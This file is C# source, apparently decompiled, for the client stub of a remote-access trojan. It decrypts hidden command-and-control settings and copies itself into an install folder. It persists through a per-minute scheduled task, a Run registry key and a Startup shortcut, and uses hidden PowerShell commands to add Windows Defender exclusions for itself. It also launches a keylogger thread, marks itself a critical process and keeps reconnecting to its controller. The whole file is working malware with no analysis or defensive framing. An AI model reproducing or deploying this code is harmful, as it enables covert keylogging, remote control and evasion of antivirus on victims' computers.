using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.CompilerServices;
using System.Threading;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using My;

namespace Stub
{
	public class Main
	{
		[STAThread]
		public static void Main()
		{
			Thread.Sleep(checked(Settings.Sleep * 1000));
			try
			{
				Settings.Hosts = Conversions.ToString(AlgorithmAES.Decrypt(Settings.Hosts));
				Settings.Port = Conversions.ToString(AlgorithmAES.Decrypt(Settings.Port));
				Settings.KEY = Conversions.ToString(AlgorithmAES.Decrypt(Settings.KEY));
				Settings.SPL = Conversions.ToString(AlgorithmAES.Decrypt(Settings.SPL));
				Settings.Groub = Conversions.ToString(AlgorithmAES.Decrypt(Settings.Groub));
				Settings.USBNM = Conversions.ToString(AlgorithmAES.Decrypt(Settings.USBNM));
				Settings.InstallDir = Environment.ExpandEnvironmentVariables(Conversions.ToString(AlgorithmAES.Decrypt(Settings.InstallDir)));
				Settings.InstallStr = Conversions.ToString(AlgorithmAES.Decrypt(Settings.InstallStr));
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				Environment.Exit(0);
				ProjectData.ClearProjectError();
			}
			if (!Helper.CreateMutex())
			{
				Environment.Exit(0);
			}
			Exclusion();
			string text = Settings.InstallDir + "\\" + Settings.InstallStr;
			try
			{
				object fullName = new FileInfo(text).Directory!.get_FullName();
				if (!Directory.Exists(Conversions.ToString(fullName)))
				{
					Directory.CreateDirectory(Conversions.ToString(fullName));
				}
				if (File.Exists(text))
				{
					FileInfo fileInfo = new FileInfo(text);
					fileInfo.Delete();
				}
				Thread.Sleep(1000);
				File.WriteAllBytes(text, File.ReadAllBytes(Helper.current));
			}
			catch (Exception ex3)
			{
				ProjectData.SetProjectError(ex3);
				Exception ex4 = ex3;
				ProjectData.ClearProjectError();
			}
			try
			{
				ProcessStartInfo processStartInfo = new ProcessStartInfo("schtasks.exe");
				processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
				if (Conversions.ToBoolean(ClientSocket.UAC()))
				{
					processStartInfo.Arguments = "/create /f /RL HIGHEST /sc minute /mo 1 /tn \"" + Path.GetFileNameWithoutExtension(Settings.InstallStr) + "\" /tr \"" + text + "\"";
				}
				else
				{
					processStartInfo.Arguments = "/create /f /sc minute /mo 1 /tn \"" + Path.GetFileNameWithoutExtension(Settings.InstallStr) + "\" /tr \"" + text + "\"";
				}
				Process process = Process.Start(processStartInfo);
				process.WaitForExit();
			}
			catch (Exception ex5)
			{
				ProjectData.SetProjectError(ex5);
				Exception ex6 = ex5;
				ProjectData.ClearProjectError();
			}
			try
			{
				((ServerComputer)MyProject.Computer).get_Registry().get_CurrentUser().OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true)!.SetValue(Path.GetFileNameWithoutExtension(Settings.InstallStr), text);
			}
			catch (Exception ex7)
			{
				ProjectData.SetProjectError(ex7);
				Exception ex8 = ex7;
				ProjectData.ClearProjectError();
			}
			try
			{
				string text2 = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + Path.GetFileNameWithoutExtension(Settings.InstallStr) + ".lnk";
				object obj = Interaction.CreateObject("WScript.Shell", "");
				object[] array = new object[1] { text2 };
				bool[] array2 = new bool[1] { true };
				object obj2 = NewLateBinding.LateGet(obj, (Type)null, "CreateShortcut", array, (string[])null, (Type[])null, array2);
				if (array2[0])
				{
					text2 = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array[0]), typeof(string));
				}
				object obj3 = obj2;
				NewLateBinding.LateSetComplex(obj3, (Type)null, "TargetPath", new object[1] { text }, (string[])null, (Type[])null, false, true);
				NewLateBinding.LateSetComplex(obj3, (Type)null, "WorkingDirectory", new object[1] { "" }, (string[])null, (Type[])null, false, true);
				NewLateBinding.LateCall(obj3, (Type)null, "Save", new object[0], (string[])null, (Type[])null, (bool[])null, true);
				obj3 = null;
				Helper.fileStream = new FileStream(text2, FileMode.Open);
			}
			catch (Exception ex9)
			{
				ProjectData.SetProjectError(ex9);
				Exception ex10 = ex9;
				ProjectData.ClearProjectError();
			}
			Helper.PreventSleep();
			new Thread((ThreadStart)delegate
			{
				XLogger.callk();
			}).Start();
			if (Conversions.ToBoolean(ClientSocket.UAC()))
			{
				ProcessCritical.CriticalProcess_Enable();
			}
			Thread thread = new Thread((ThreadStart)delegate
			{
				Helper.LastAct();
			});
			Thread thread2 = new Thread((ThreadStart)delegate
			{
				while (true)
				{
					Thread.Sleep(new Random().Next(3000, 10000));
					if (!ClientSocket.isConnected)
					{
						ClientSocket.isDisconnected();
						ClientSocket.BeginConnect();
					}
					ClientSocket.allDone.WaitOne();
				}
			});
			thread.Start();
			thread2.Start();
			thread2.Join();
		}

		public static void Exclusion()
		{
			if (Conversions.ToBoolean(ClientSocket.UAC()))
			{
				try
				{
					ProcessStartInfo processStartInfo = new ProcessStartInfo();
					processStartInfo.FileName = "powershell.exe";
					processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
					processStartInfo.Arguments = "-ExecutionPolicy Bypass Add-MpPreference -ExclusionPath '" + Helper.current + "'";
					Process.Start(processStartInfo)!.WaitForExit();
					processStartInfo.Arguments = "-ExecutionPolicy Bypass Add-MpPreference -ExclusionProcess '" + Process.GetCurrentProcess().MainModule!.ModuleName + "'";
					Process.Start(processStartInfo)!.WaitForExit();
					processStartInfo.Arguments = "-ExecutionPolicy Bypass Add-MpPreference -ExclusionPath '" + Settings.InstallDir + "\\" + Settings.InstallStr + "'";
					Process.Start(processStartInfo)!.WaitForExit();
					processStartInfo.Arguments = "-ExecutionPolicy Bypass Add-MpPreference -ExclusionProcess '" + Path.GetFileName(Settings.InstallStr) + "'";
					Process.Start(processStartInfo)!.WaitForExit();
				}
				catch (Exception ex)
				{
					ProjectData.SetProjectError(ex);
					Exception ex2 = ex;
					ProjectData.ClearProjectError();
				}
			}
		}
	}
}
